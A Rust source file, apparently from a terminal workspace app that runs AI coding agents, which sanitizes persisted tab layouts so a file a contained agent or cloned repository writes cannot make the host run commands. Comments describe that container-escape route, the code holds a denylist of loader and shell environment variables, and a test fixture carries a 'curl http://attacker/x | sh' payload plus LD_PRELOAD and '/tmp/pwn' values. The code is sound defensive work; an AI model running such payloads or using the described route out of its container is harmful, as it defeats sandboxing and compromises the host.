use crate::brand::SLUG;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

use serde_json::Value;

use crate::schema::project::{OpenApp, TabEntry};
use crate::schema::session::TerminalSession;
use crate::storage;

/// Save a project's tab layout.
///
/// `project_id` is what the state lives under (`<state_dir>/sessions/<key>/`),
/// and `local_file` is only where the **export copy** goes. Passing `None` for
/// the id means there is no project to key by (the root scope), in which case
/// nothing is persisted — the root scope's tabs were never restored from disk.
///
/// `groups` is the opaque split/group layout tree (None clears it).
/// `sessions` is the opaque list of open agent-session UUIDs: `Some([])` clears
/// it, `Some(list)` replaces it, and `None` leaves the stored value untouched.
///
/// `allow_clear` is what makes an EMPTY `tabs` mean "the user closed every tab"
/// rather than "the caller had nothing loaded". Only the frontend can tell those
/// apart, and it only knows for a scope it actually hydrated — see the guard in
/// `write_terminal_session`.
pub fn save_tab_layout(
    project_id: Option<&str>,
    local_file: &str,
    tabs: &[TabEntry],
    groups: Option<Value>,
    sessions: Option<Value>,
    allow_clear: bool,
) -> Result<(), String> {
    write_terminal_session(
        project_id,
        local_file,
        tabs,
        0,
        groups,
        sessions,
        allow_clear,
    )
}

/// The project-switch snapshot: a picture of what was in memory, through the
/// workspace service like every other writer (headless owner plan, H1).
/// `base_version` is the version the client last saw for the scope; `None`
/// is a client that never received one, whose snapshot then reads as the
/// whole set. It carries no session list (a `None` leaves the stored UUIDs
/// untouched) and never clears: an empty snapshot far more often means "this
/// scope was never loaded" than "the user closed everything" — the debounced
/// save owns that intent.
pub fn save_terminal_session(
    project_id: Option<&str>,
    local_file: &str,
    tabs: &[TabEntry],
    active_tab_index: usize,
    groups: Option<Value>,
    base_version: Option<u64>,
) -> Result<(), String> {
    let Some(project_id) = project_id else {
        return Ok(());
    };
    let client = crate::services::workspace::ClientSync {
        base_version: base_version.unwrap_or(0),
        tabs: tabs.to_vec(),
        groups,
        sessions: None,
        active_tab_index: Some(active_tab_index),
        allow_clear: false,
    };
    crate::services::workspace::sync(project_id, local_file, client).map(|_| ())
}

#[allow(clippy::too_many_arguments)]
fn write_terminal_session(
    project_id: Option<&str>,
    local_file: &str,
    tabs: &[TabEntry],
    active_tab_index: usize,
    groups: Option<Value>,
    sessions: Option<Value>,
    allow_clear: bool,
) -> Result<(), String> {
    // An empty layout is DESTRUCTIVE — it drops `tab_layout`/`tab_groups` from
    // project.json *and* overwrites the `.tabtivity` mirror with an empty one, in a
    // single call. The two are written from the same array, so the mirror is not a
    // backup: one empty save takes both copies, and a persisted agent tab's
    // `sessionId` is the only handle on its conversation.
    //
    // That is fine when the user really did close every tab, and catastrophic
    // otherwise — and "otherwise" is reachable, which is how a live project lost four
    // tabs on detach: the frontend's debounced autosave persists the tab store's
    // CURRENT scope into the ACTIVE project's `local_file`, two values it tracks
    // independently. Detach swaps `local_file` (state dir → promoted mirror) under
    // a store whose scope has not caught up, the per-scope tab filter correctly
    // refuses to write another project's tabs into this file, and what lands is an
    // empty list that reads exactly like a deliberate close-all.
    //
    // So an empty layout only clears when the caller states it means one.
    if tabs.is_empty() && !allow_clear {
        return Ok(());
    }
    let Some(project_id) = project_id else {
        // No id to key by. Every UI caller now passes one — a project id, or the
        // literal `"root"` for the root scope (whose tabs ARE persisted and
        // restored, under `<state_dir>/sessions/root/`). A bare `None` is left only
        // as a defensive no-op: with no key there is nowhere in the state dir to
        // write, and the export copy alone would create a file nothing ever reads.
        return Ok(());
    };

    // Preserve the fields this call does not carry. `open_apps` is never written
    // by any caller (it is legacy restore metadata), so it only survives by being
    // read back; the session UUIDs survive a `None` the same way.
    let prev = read_state_session(project_id).unwrap_or_default();
    // Once the workspace service holds a scope's tab set (headless owner plan,
    // H1), a whole-snapshot save would be exactly the last-writer-wins write it
    // exists to replace: two clients saving the same scope erase each other's
    // tabs. Every writer goes through `workspace::sync` from then on.
    if crate::services::workspace::is_owned(&prev) {
        return Err(crate::services::workspace::OWNED_ERROR.to_string());
    }
    let session = TerminalSession {
        tab_layout: tabs.to_vec(),
        active_tab_index,
        // Clear the tree when there are no tabs; otherwise persist what was sent
        // (a missing tree is tolerated → frontend rebuilds a single group on load).
        tab_groups: if tabs.is_empty() { None } else { groups },
        // Only touch the persisted session UUIDs when a list was supplied; an
        // empty list clears them, a missing list (None) preserves what's on disk.
        open_tab_sessions: match sessions {
            Some(s) if s.as_array().is_some_and(|a| a.is_empty()) => None,
            Some(s) => Some(s),
            None => prev.open_tab_sessions,
        },
        open_apps: prev.open_apps,
        extra: prev.extra,
    };
    store_state_session(project_id, local_file, &session)
}

/// Write a project's session file as given — the one place the state-dir copy
/// is written — then prune the host-bound markers it no longer names and
/// refresh the project-tree export copy.
pub(crate) fn store_state_session(
    project_id: &str,
    local_file: &str,
    session: &TerminalSession,
) -> Result<(), String> {
    let dir = storage::project_session_dir(project_id);
    if let Err(e) = std::fs::create_dir_all(&dir) {
        return Err(format!("create session dir: {e}"));
    }
    storage::write_json_atomic(&dir.join(TERMINALS_FILE), session).map_err(|e| e.to_string())?;
    after_state_session_write(project_id, local_file);
    Ok(())
}

/// What follows every write of the state-dir session file, whoever wrote it
/// (this module or `services::workspace`): stale host-bound markers pruned
/// and the project-tree export copy refreshed from what is now on disk.
pub(crate) fn after_state_session_write(project_id: &str, local_file: &str) {
    let Some(session) = read_state_session(project_id) else {
        return;
    };
    // Drop host-bound markers (#150) for tabs this project no longer has, so the
    // directory does not accumulate one file per local-model tab ever opened.
    // Driven off the layout that was just saved, which is the same file the spawn
    // path's uid comes back from.
    let live: HashSet<String> = session
        .tab_layout
        .iter()
        .filter_map(|t| t.extra.get(HOST_BOUND_UID_KEY).and_then(Value::as_str))
        .map(str::to_string)
        .collect();
    crate::services::sandbox::prune_host_bound_markers(project_id, &live);

    write_export_copy(local_file, &session);
}

/// The state-dir session file's path — what the workspace service locks.
pub(crate) fn state_session_path(project_id: &str) -> PathBuf {
    storage::project_session_dir(project_id).join(TERMINALS_FILE)
}

/// Write the project-tree copy of the layout: `<project>/.tabtivity/sessions/
/// terminals.json`.
///
/// **Export-only.** Nothing reads this file on its own — not on relaunch, not on
/// project switch, not on import. It exists so the layout keeps travelling with a
/// folder that is byte-synced to another machine, copied, or moved by hand, which
/// is the one real cost of moving the authoritative copy into the state dir. A
/// user who wants it back asks for it (`adopt_folder_tab_layout`), and what they
/// get goes through [`sanitize_untrusted_layout`] first.
///
/// The asymmetry is the whole point: *writing* a file into the container's
/// writable mount grants nothing, and *reading* one back as a command to run is
/// the entire bug class. Keeping the write and dropping the automatic read costs
/// nothing and keeps the portability property.
fn write_export_copy(local_file: &str, session: &TerminalSession) {
    let Some(sessions_dir) = app_sessions_dir(local_file) else {
        return;
    };
    // A schedule binding is local control-plane state: exporting it would make a
    // copied/cloned project able to name an existing target in agent_tasks.json.
    // The authoritative state-dir copy keeps it; the travelling project copy
    // deliberately does not.
    let mut exported = session.clone();
    for tab in &mut exported.tab_layout {
        tab.extra.remove(SCHEDULE_TARGET_KEY);
    }
    // The workspace service's bookkeeping names this installation's version
    // history; a folder copy adopted elsewhere starts its own.
    exported.extra.remove(crate::services::workspace::VERSION_KEY);
    exported.extra.remove(crate::services::workspace::CLOSED_KEY);
    // Every tab-store change saves the layout, and most change nothing in it.
    // This copy sits in the project tree, where a watcher, an agent or a
    // byte-sync sees each rewrite, so a copy that already says the same is left
    // alone. Compared as JSON values, not bytes: the `extra` maps are
    // `HashMap`s, whose keys serialize in a different order every time.
    let path = sessions_dir.join(TERMINALS_FILE);
    let unchanged = serde_json::to_value(&exported).is_ok_and(|fresh| {
        storage::read_json::<Value>(&path).is_ok_and(|on_disk| on_disk == fresh)
    });
    if unchanged {
        return;
    }
    if let Err(e) = storage::write_json_atomic(&path, &exported) {
        eprintln!("terminal_service: write .{SLUG} export copy: {e}");
    }
}

/// Load a project's full terminal session (tab layout + active tab index) from
/// the state dir. **The only automatic read of layout state there is.**
///
/// It reads `<state_dir>/sessions/<key>/terminals.json` and nothing else — in
/// particular not `<project>/.tabtivity/sessions/terminals.json` and not
/// `project.json`, both of which sit inside the project container's writable rw
/// mount and inside any repository that gets cloned or imported as a project.
/// That was the escape: the frontend rehydrates `cmd` / `resumeArgs` / `env` /
/// `cwd` / `location` from this layout straight into `pty_spawn`, so a file the
/// contained agent could write was a file the host executed.
///
/// The result is *still* passed through [`sanitize_tab_layout`]. The state dir is
/// trustworthy, so this is now the second layer rather than the only one — it
/// costs nothing, it guards the migration and adopt paths (which do read the
/// untrusted copy), and it is what catches a future feature that reintroduces a
/// project-tree read.
pub fn load_terminal_session(project_id: &str) -> TerminalSession {
    let mut session = read_state_session(project_id).unwrap_or_default();
    sanitize_loaded_layout(&mut session.tab_layout);
    session
}

/// Re-point the saved tab layout's paths after the project folder moved from
/// `old` to `new` (see [`storage::rewrite_path_prefix`]). Read and written as
/// plain JSON so fields this build does not model survive. A project with no
/// saved layout is fine; returns whether the file changed.
pub fn rewrite_session_paths(project_id: &str, old: &str, new: &str) -> Result<bool, String> {
    let path = storage::project_session_dir(project_id).join(TERMINALS_FILE);
    if !path.exists() {
        return Ok(false);
    }
    let _lock = storage::FileLock::exclusive(&path).map_err(|e| e.to_string())?;
    let mut session: Value = storage::read_json(&path).map_err(|e| e.to_string())?;
    if !storage::rewrite_path_prefix(&mut session, old, new) {
        return Ok(false);
    }
    // The tab set changed: move the scope's version so a client re-syncs.
    crate::services::workspace::bump_raw_version(&mut session);
    storage::write_json_atomic(&path, &session).map_err(|e| e.to_string())?;
    Ok(true)
}

/// Read the state-dir session file verbatim (no sanitizing, no fallback).
pub(crate) fn read_state_session(project_id: &str) -> Option<TerminalSession> {
    let path = storage::project_session_dir(project_id).join(TERMINALS_FILE);
    if !path.exists() {
        return None;
    }
    storage::read_json::<TerminalSession>(&path).ok()
}

// ── Untrusted-layout sanitizing ───────────────────────────────────────────────

/// The internal pane markers a persisted `cmd` may name. These spawn no process at
/// all (the frontend renders a pane for them), and are listed so a marker tab is
/// not needlessly downgraded to a shell.
const PANE_MARKER_CMDS: &[&str] = &[
    crate::app_tab_command!("files"),
    crate::app_tab_command!("project_files"),
    crate::app_tab_command!("blob"),
    crate::app_tab_command!("network"),
    crate::app_tab_command!("monitor"),
    crate::app_tab_command!("diskusage"),
    crate::app_tab_command!("calendar"),
    crate::app_tab_command!("mail"),
    crate::app_tab_command!("browser"),
    crate::app_tab_command!("printing"),
    crate::app_tab_command!("skillslibrary"),
    crate::app_tab_command!("promptchart"),
];

/// Agent CLIs a persisted tab may relaunch. Mirrors the frontend's `AGENT_CMDS`
/// plus the local-model drivers (`commands::ollama::LOCAL_DRIVERS`), because those
/// are the only commands `loadFromLayout` can legitimately have written.
const AGENT_CMDS: &[&str] = &[
    "claude",
    "codex",
    "gemini",
    "agy",
    "vibe",
    "aider",
    "opencode",
    "cursor-agent",
    "copilot",
    "grok",
    "qwen",
    "openclaw",
    "droid",
    "ollama",
];

/// Script interpreters a Run tab persists as its `cmd` (`lib/terminal/shellScriptRun.ts`'s
/// `ScriptShell`, plus bare `sh`). A Python Run tab persists `cmd: ""` and types
/// its command line as input instead, so no interpreter path appears here.
const SCRIPT_INTERP_CMDS: &[&str] = &["sh", "bash", "zsh", "fish", "ksh", "powershell", "cmd"];

/// Every command a persisted tab entry may carry: the empty string (the host's
/// default shell), the pane markers, the agent CLIs, the script interpreters, and
/// whatever the user configured as a **custom agent** — the latter read from
/// `settings.json` in the state dir, which no container mounts, so it is a
/// trustworthy source even though the layout naming it is not.
fn known_tab_commands(custom: &HashMap<String, CustomAgentSpec>) -> HashSet<String> {
    let mut set: HashSet<String> = HashSet::new();
    set.insert(String::new());
    for c in PANE_MARKER_CMDS
        .iter()
        .chain(AGENT_CMDS)
        .chain(SCRIPT_INTERP_CMDS)
    {
        set.insert((*c).to_string());
    }
    for cmd in custom.keys() {
        set.insert(cmd.clone());
    }
    set
}

/// What a custom agent's `settings.json` entry says about its tabs.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CustomAgentSpec {
    /// Its "continue last session" argv; empty for a launch-only agent.
    pub resume: Vec<String>,
    /// The environment the user gave it (`CustomAgent.env`).
    pub env: HashMap<String, String>,
}

/// The user's custom agents as `cmd → spec`, read from
/// `Settings.custom_agents` (the settings `extra` catch-all).
///
/// `settings.json` lives in the state dir, which no container mounts, so this is
/// the trustworthy source for **every** question the sanitizer asks: which command
/// a persisted layout may name, what argv that command's resume is allowed to
/// use, and which of the variables [`strip_persisted_env`] would drop it really
/// sets. A custom agent with no resume flag has an empty `resume` — it is
/// launch-only, so a persisted `resumeArgs` for it is never legitimate.
pub(crate) fn custom_agent_specs() -> HashMap<String, CustomAgentSpec> {
    let path = storage::state_dir().join("settings.json");
    let Ok(settings) = storage::read_json::<crate::schema::Settings>(&path) else {
        return HashMap::new();
    };
    settings
        .extra
        .get("custom_agents")
        .and_then(Value::as_array)
        .map(|list| {
            list.iter()
                .filter_map(|a| {
                    let cmd = a.get("cmd").and_then(Value::as_str)?.trim();
                    if cmd.is_empty() {
                        return None;
                    }
                    let resume = a
                        .get("resumeArgs")
                        .and_then(Value::as_array)
                        .map(|v| {
                            v.iter()
                                .filter_map(Value::as_str)
                                .map(str::to_string)
                                .collect()
                        })
                        .unwrap_or_default();
                    let env = a
                        .get("env")
                        .and_then(Value::as_object)
                        .map(|m| {
                            m.iter()
                                .filter_map(|(k, v)| Some((k.clone(), v.as_str()?.to_string())))
                                .collect()
                        })
                        .unwrap_or_default();
                    Some((cmd.to_string(), CustomAgentSpec { resume, env }))
                })
                .collect()
        })
        .unwrap_or_default()
}

/// Sanitize an untrusted persisted layout in place against the current known-good
/// command set. The entry point for callers that read `project.json` themselves
/// (`commands::projects::load_project`, which the frontend's relaunch path uses)
/// rather than going through [`load_terminal_session`].
pub fn sanitize_loaded_layout(tabs: &mut [TabEntry]) {
    let custom = custom_agent_specs();
    sanitize_tab_layout(tabs, &known_tab_commands(&custom), &custom);
}

/// Sanitize a project-tree layout and remove state-directory-only bindings that
/// an exported/adopted folder is never allowed to introduce.
fn sanitize_untrusted_layout(tabs: &mut [TabEntry]) {
    sanitize_untrusted_layout_with(tabs, &custom_agent_specs());
}

/// [`sanitize_untrusted_layout`] against a given custom-agent set.
///
/// Beyond the trusted load's rules, no tab keeps its `env` or `embedExec`
/// (gap 17). Every variable a tab of this installation needs is rebuilt
/// rather than read from the copy: the frontend re-derives `TAB_UID` from the
/// tab's `sessionId` on restore (`restoreSavedTab`), the backend sets its own
/// control variables at spawn (`launch_prep::prepare`), and a registered
/// custom agent gets the environment its `settings.json` entry names. What a
/// folder or a mailed bundle brought is another installation's choice of
/// `PATH`, loader variables or `VIBE_HOME`, and an embed's open command.
fn sanitize_untrusted_layout_with(tabs: &mut [TabEntry], custom: &HashMap<String, CustomAgentSpec>) {
    sanitize_tab_layout(tabs, &known_tab_commands(custom), custom);
    for tab in tabs {
        tab.extra.remove(SCHEDULE_TARGET_KEY);
        // A relaunchable local-model tab is started from the state dir's
        // layout only; a folder copy never brings one back.
        tab.extra.remove(LOCAL_LAUNCH_KEY);
        tab.extra.remove(ENV_KEY);
        tab.extra.remove(EMBED_EXEC_KEY);
        if let Some(spec) = custom.get(&tab.cmd).filter(|spec| !spec.env.is_empty()) {
            let env = spec.env.iter().map(|(k, v)| (k.clone(), Value::String(v.clone()))).collect();
            tab.extra.insert(ENV_KEY.to_string(), Value::Object(env));
        }
    }
}

/// Neutralize every layout entry whose `cmd` is not a known tab command.
///
/// Entries are **kept**, not dropped: the tab still comes back (with its label,
/// kind and cwd) so a restore never silently loses a pane. What is removed is the
/// entry's authority — its `cmd` becomes the plain default shell, and the fields
/// that would carry attacker-chosen argv, environment or locality into
/// `pty_spawn` (`resumeArgs`, `env`, `location`, `sessionId`) are stripped. A tab
/// whose `cmd` *is* known keeps its locality and session id, its `resumeArgs`
/// only as its trustworthy source states them ([`rebuild_resume_args`]), and its
/// `env` minus the variables no tab layout may set ([`strip_persisted_env`]), so
/// legitimate agent resume, remote locality and vibe's `VIBE_HOME` are untouched.
///
/// `sessionId` goes too: with `cmd` reset the entry is no longer a resumable agent
/// tab, and a leftover id would only make `isResumableAgentTab` disagree with it.
pub fn sanitize_tab_layout(
    tabs: &mut [TabEntry],
    known: &HashSet<String>,
    custom: &HashMap<String, CustomAgentSpec>,
) {
    for tab in tabs.iter_mut() {
        if known.contains(&tab.cmd) {
            rebuild_resume_args(tab, custom);
            keep_valid_local_launch(tab);
            strip_persisted_env(tab, custom);
            continue;
        }
        eprintln!(
            "terminal_service: persisted tab '{}' names an unknown command '{}' — restoring it as \
             a plain shell and dropping its args/env/location",
            tab.label, tab.cmd
        );
        tab.cmd = String::new();
        tab.session_id = None;
        for key in [
            "resumeArgs",
            ENV_KEY,
            "location",
            "args",
            HOST_BOUND_UID_KEY,
            SCHEDULE_TARGET_KEY,
            LOCAL_LAUNCH_KEY,
        ] {
            tab.extra.remove(key);
        }
    }
}

/// Drop a persisted `localLaunch` unless it is a local-model tab's launch line
/// Tabtivity itself builds for the driver and model it names
/// (`commands::ollama::local_launch_line_ok`). The field is what lets such a
/// tab restore at all — the frontend relaunches it with `localLaunch.args` —
/// so, like `resumeArgs`, it is an argv for a host-bound agent CLI and is never
/// trusted from disk as written. Without it the tab is simply not restorable.
fn keep_valid_local_launch(tab: &mut TabEntry) {
    let Some(launch) = tab.extra.get(LOCAL_LAUNCH_KEY) else {
        return;
    };
    let local_agent = tab.extra.get("kind").and_then(Value::as_str) == Some("local_agent");
    if !(local_agent && local_launch_ok(launch, &tab.cmd)) {
        tab.extra.remove(LOCAL_LAUNCH_KEY);
    }
}

/// Whether a persisted `localLaunch` value (`{driver, model, args}`) is a line
/// Tabtivity builds for `cmd`. Shared with the phone's catalog, which reads the
/// same file raw.
pub(crate) fn local_launch_ok(launch: &Value, cmd: &str) -> bool {
    let (Some(driver), Some(model), Some(args)) = (
        launch.get("driver").and_then(Value::as_str),
        launch.get("model").and_then(Value::as_str),
        launch.get("args").and_then(Value::as_array),
    ) else {
        return false;
    };
    let Some(args) = args
        .iter()
        .map(|a| a.as_str().map(str::to_string))
        .collect::<Option<Vec<_>>>()
    else {
        return false;
    };
    crate::commands::ollama::local_launch_line_ok(driver, model, cmd, &args)
}

/// Whether a persisted tab `env` may not set `key` (gap 17): the variables that
/// pick which program runs or what it loads before its first line — the shell's
/// startup and prompt hooks, `PATH`, the dynamic loader's, git's, the
/// interpreters' — the user's own config homes, and the app's control variables
/// (`launch_prep::is_control_env`), which only Tabtivity sets.
///
/// Built-in tabs never persist one of these; a layout that carries one was
/// written by something else.
pub(crate) fn persisted_env_denied(key: &str) -> bool {
    const EXACT: &[&str] = &[
        "PATH", "BASH_ENV", "ENV", "PROMPT_COMMAND", "PS4", "SHELLOPTS", "BASHOPTS", "IFS",
        "ZDOTDIR", "HOME", "INPUTRC", "EDITOR", "VISUAL", "PAGER", "MANPAGER", "BROWSER",
        "LESSOPEN", "LESSCLOSE", "NODE_OPTIONS", "NODE_PATH", "PYTHONPATH", "PYTHONSTARTUP",
        "PYTHONHOME", "PERL5OPT", "PERL5LIB", "PERL5DB", "RUBYOPT", "RUBYLIB",
        "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "JDK_JAVA_OPTIONS",
        // Set by Tabtivity at spawn for a CLI it wires to its MCP lanes or
        // its loaded models; each can name a program the CLI starts.
        "VIBE_MCP_SERVERS", "VIBE_ENABLED_TOOLS", "OPENCODE_CONFIG_CONTENT",
    ];
    const PREFIXES: &[&str] = &["LD_", "DYLD_", "GIT_", "SSH_ASKPASS"];
    EXACT.contains(&key)
        || PREFIXES.iter().any(|p| key.starts_with(p))
        || (key.starts_with("XDG_") && (key.ends_with("_HOME") || key.ends_with("_DIRS")))
        || crate::services::launch_prep::is_control_env(key)
}

/// Drop from a known-command tab's persisted `env` every variable
/// [`persisted_env_denied`] names, unless the tab is a registered custom agent
/// whose `settings.json` entry sets that variable to the same value (the user
/// chose it there, as `rebuild_resume_args` trusts the spec's resume flag). An
/// `env` that is not an object is dropped whole. Every other variable stays:
/// `TAB_UID`, a local-model tab's `VIBE_HOME`, a Run tab's `PY_*`.
///
/// Runs on every load, the state dir's included, and on the headless owner's
/// raw record reads (`mobile_control::headless::launch_options`). Names only in
/// the log.
pub(crate) fn strip_persisted_env(tab: &mut TabEntry, custom: &HashMap<String, CustomAgentSpec>) {
    let Some(env) = tab.extra.get_mut(ENV_KEY) else {
        return;
    };
    let Some(map) = env.as_object_mut() else {
        tab.extra.remove(ENV_KEY);
        return;
    };
    let spec = custom.get(&tab.cmd).map(|spec| &spec.env);
    let mut dropped: Vec<String> = Vec::new();
    map.retain(|key, value| {
        if !persisted_env_denied(key) {
            return true;
        }
        let named = spec.and_then(|env| env.get(key)).is_some_and(|want| value.as_str() == Some(want.as_str()));
        if !named {
            dropped.push(key.clone());
        }
        named
    });
    if !dropped.is_empty() {
        dropped.sort();
        eprintln!(
            "terminal_service: persisted tab '{}' set {} in its env — dropped",
            tab.label,
            dropped.join(", ")
        );
    }
}

/// Replace a known-command entry's persisted `resumeArgs` with the value its
/// *trustworthy* source states, or remove the field when there is no such value.
///
/// A known `cmd` is not enough on its own: `resumeArgs` is handed to the restored
/// tab as its launch argv, so a persisted vector is a free choice of arguments to
/// whichever binary the (also persisted) `cmd` names. For the host-bound agent
/// CLIs that is a host-side exec with attacker-chosen flags — the container is not
/// involved, because those tabs are deliberately allowed to run on the host.
///
/// Neither kind of agent needs the persisted value:
/// - a **built-in** rebuilds its flag from the frontend's `RESUMABLE_AGENTS` table
///   (keyed on `cmd`, fed the captured session id), so the field is redundant;
/// - a **custom** agent's flag is part of its `settings.json` spec, which is where
///   the frontend put it in the first place.
///
/// So the field is dropped for everything except a registered custom agent, whose
/// value is re-read from the spec rather than trusted from disk. A tab that is left
/// with no `resumeArgs` and whose `cmd` is not in the built-in table simply stops
/// being a resumable agent tab (`isResumableAgentTab`) and restores with no args.
fn rebuild_resume_args(tab: &mut TabEntry, custom: &HashMap<String, CustomAgentSpec>) {
    match custom.get(&tab.cmd).map(|spec| &spec.resume) {
        Some(resume) if !resume.is_empty() => {
            let want = Value::Array(resume.iter().map(|a| Value::String(a.clone())).collect());
            if tab.extra.get("resumeArgs") != Some(&want) {
                tab.extra.insert("resumeArgs".to_string(), want);
            }
        }
        _ => {
            tab.extra.remove("resumeArgs");
        }
    }
}

/// Load the project's `open_apps` list — the standalone apps
/// `restore_service::restore_project_apps` relaunches on every activation.
///
/// Read from the state dir, like the layout and for the same reason: this list
/// turns into a host-side `spawn_reaped` outside any container. It is legacy
/// metadata nothing writes any more, so in practice it is empty for every project
/// that did not carry one across the migration.
pub fn load_open_apps(project_id: &str) -> Vec<OpenApp> {
    read_state_session(project_id)
        .and_then(|s| s.open_apps)
        .unwrap_or_default()
}

// ── The project-tree copy ─────────────────────────────────────────────────
//
// Everything below reads the *untrusted* copy inside the project tree. These are
// the only functions in the backend allowed to, and each one either runs exactly
// once per install (the migration) or is driven by an explicit user click (the
// adopt). Both sanitize what they read before it is stored or returned.

/// Read the project-tree export copy, or the legacy `project.json` fields if no
/// export copy exists (Tabtivity wrote both before the move).
///
/// **Untrusted.** Every caller must sanitize.
fn read_project_tree_session(local_file: &str) -> Option<TerminalSession> {
    if let Some(dir) = app_sessions_dir(local_file) {
        let path = dir.join(TERMINALS_FILE);
        if path.exists() {
            if let Ok(session) = storage::read_json::<TerminalSession>(&path) {
                return Some(session);
            }
        }
    }
    // Legacy: the layout used to be duplicated into project.json itself, and a
    // project last written by an older Tabtivity may only have that copy.
    let project: crate::schema::project::Project =
        storage::read_json(&PathBuf::from(local_file)).ok()?;
    let tab_layout = project.tab_layout.unwrap_or_default();
    if tab_layout.is_empty() && project.open_apps.is_none() {
        return None;
    }
    Some(TerminalSession {
        tab_layout,
        active_tab_index: 0,
        tab_groups: project.tab_groups,
        open_tab_sessions: project.open_tab_sessions,
        open_apps: project.open_apps,
        extra: Default::default(),
    })
}

/// Adopt the project-tree copy of a layout as this project's session state, at
/// the user's explicit request. Returns the sanitized session it stored.
///
/// This is the deliberate replacement for the automatic fallback that used to
/// happen on every load. Same bytes, same sanitizer — the difference is that a
/// person asked for them, which is the whole distinction between "the layout
/// travels with the folder" (a feature) and "a cloned repository chooses what the
/// host runs" (the bug).
pub fn adopt_project_tree_session(
    project_id: &str,
    local_file: &str,
) -> Result<TerminalSession, String> {
    let session = read_project_tree_session(local_file)
        .ok_or_else(|| "no saved layout in this folder".to_string())?;
    adopt_untrusted_session(project_id, session)
}

/// Store a session that arrived from **outside this installation** as
/// `project_id`'s layout, sanitized. Returns what was stored.
///
/// The one path both untrusted adoptions share: the project-tree copy
/// ([`adopt_project_tree_session`]) and a project export bundle
/// (`commands::project_transfer`). A bundle is a file that can be mailed, so its
/// layout gets exactly the treatment a cloned repository's does — same
/// sanitizer, same dropped `open_apps` — rather than a second, looser rule that
/// would quietly become the way in.
pub fn adopt_untrusted_session(
    project_id: &str,
    mut session: TerminalSession,
) -> Result<TerminalSession, String> {
    sanitize_untrusted_layout(&mut session.tab_layout);
    // `open_apps` is not adopted: a folder-supplied list of host commands to
    // launch is precisely what the move was about, and no legitimate workflow
    // needs one to travel. The tabs do.
    session.open_apps = None;
    // A folder's bookkeeping names another installation's version history;
    // the workspace service starts this scope's own when it stores the edit.
    session.extra.remove(crate::services::workspace::VERSION_KEY);
    session.extra.remove(crate::services::workspace::CLOSED_KEY);
    for tab in session.tab_layout.iter_mut() {
        tab.extra.remove(crate::services::workspace::TAB_ID_KEY);
        tab.extra.remove(crate::services::workspace::TAB_CREATED_KEY);
    }
    crate::services::workspace::edit_in(&state_session_path(project_id), project_id, |stored| {
        *stored = session;
        Ok(())
    })
}

/// One-shot adoption of every existing project's project-tree session state into
/// the state dir. Called once at startup.
///
/// **Once per installation, not once per project** — that difference is what
/// keeps this from being the old hole under a new name. A project registered
/// *after* the migration ran (a fresh scaffold, or an imported/cloned repository)
/// is never adopted from, so a hostile tree's layout is inert from the moment it
/// arrives. Projects that predate the move keep their tabs.
///
/// Logs what it migrated: a silently-wrong one-time read is the failure mode this
/// whole change is most exposed to.
pub fn migrate_project_sessions_once() {
    let marker = storage::sessions_root().join(MIGRATED_MARKER);
    if marker.exists() {
        return;
    }
    let list_path = storage::state_dir().join("projects.json");
    let projects: crate::schema::projects::ProjectsList =
        storage::read_json(&list_path).unwrap_or_default();

    let mut migrated = 0usize;
    for entry in &projects {
        if entry.local_file.is_empty() {
            continue;
        }
        let dir = storage::project_session_dir(&entry.id);
        if dir.join(TERMINALS_FILE).exists() {
            continue;
        }
        let Some(mut session) = read_project_tree_session(&entry.local_file) else {
            continue;
        };
        sanitize_untrusted_layout(&mut session.tab_layout);
        if std::fs::create_dir_all(&dir).is_err() {
            continue;
        }
        match storage::write_json_atomic(&dir.join(TERMINALS_FILE), &session) {
            Ok(()) => {
                migrated += 1;
                eprintln!(
                    "terminal_service: migrated {} tab(s){} for project '{}' out of the project tree",
                    session.tab_layout.len(),
                    match session.open_apps.as_ref().map(Vec::len).unwrap_or(0) {
                        0 => String::new(),
                        n => format!(" and {n} open_apps entr(y/ies)"),
                    },
                    entry.name,
                );
            }
            Err(e) => eprintln!("terminal_service: migrate '{}': {e}", entry.name),
        }
    }

    if let Err(e) = std::fs::create_dir_all(storage::sessions_root())
        .and_then(|()| std::fs::write(&marker, b"1"))
    {
        // Without the marker the pass would run again next launch. That is only
        // wasteful (every project now has a state-dir copy, so each one is
        // skipped) — but say so, because it also means a project imported before
        // the next launch would be eligible for adoption.
        eprintln!("terminal_service: could not record the session migration marker: {e}");
    }
    if migrated > 0 {
        eprintln!("terminal_service: session migration complete ({migrated} project(s))");
    }
}

// ── helpers ───────────────────────────────────────────────────────────────

/// Filename of the layout snapshot, in both its state-dir and export locations.
const TERMINALS_FILE: &str = "terminals.json";

/// Marks the one-shot migration as done: `<state_dir>/sessions/.migrated`.
const MIGRATED_MARKER: &str = ".migrated";

/// The layout field carrying a tab's host-bound marker id (#150). An index into
/// `<state_dir>/sessions/<project>/host_bound/`, never an authority on its own.
const HOST_BOUND_UID_KEY: &str = "hostBoundUid";

/// Stable binding into local-only `agent_tasks.json`. Never exported/adopted.
const SCHEDULE_TARGET_KEY: &str = "scheduleTargetId";

/// A local-model tab's driver, model and launch argv (`TabEntry.localLaunch`),
/// persisted so it restores. Validated on every load; never adopted.
const LOCAL_LAUNCH_KEY: &str = "localLaunch";

/// A tab's environment overrides (`TabEntry.env`). Filtered on every load
/// ([`strip_persisted_env`]); never adopted.
const ENV_KEY: &str = "env";

/// How an embed tab opens its file (`TabEntry.embedExec`); `EmbedPane` runs it
/// on mount. Never adopted.
const EMBED_EXEC_KEY: &str = "embedExec";

/// `<project>/.tabtivity/sessions/` — where the **export** copies of the session
/// files live (and where `filetabs.json` / `layout.json` / `windows.json` still
/// live outright; none of those is executable intent).
pub fn app_sessions_dir(local_file: &str) -> Option<PathBuf> {
    Path::new(local_file)
        .parent()
        .map(|p| p.join(crate::brand::PROJECT_DIR).join("sessions"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn entry(cmd: &str) -> TabEntry {
        let mut extra = std::collections::HashMap::new();
        extra.insert("location".to_string(), Value::String("local".to_string()));
        extra.insert(
            "resumeArgs".to_string(),
            serde_json::json!(["-c", "curl http://attacker/x | sh"]),
        );
        extra.insert(
            "env".to_string(),
            serde_json::json!({
                "LD_PRELOAD": "/tmp/x.so",
                "VIBE_HOME": "/home/u/.vibe-local",
                crate::app_env!("TAB_UID"): "00000000-0000-0000-0000-000000000000",
            }),
        );
        extra.insert(
            "embedExec".to_string(),
            serde_json::json!({ "kind": "app", "command": "/tmp/pwn" }),
        );
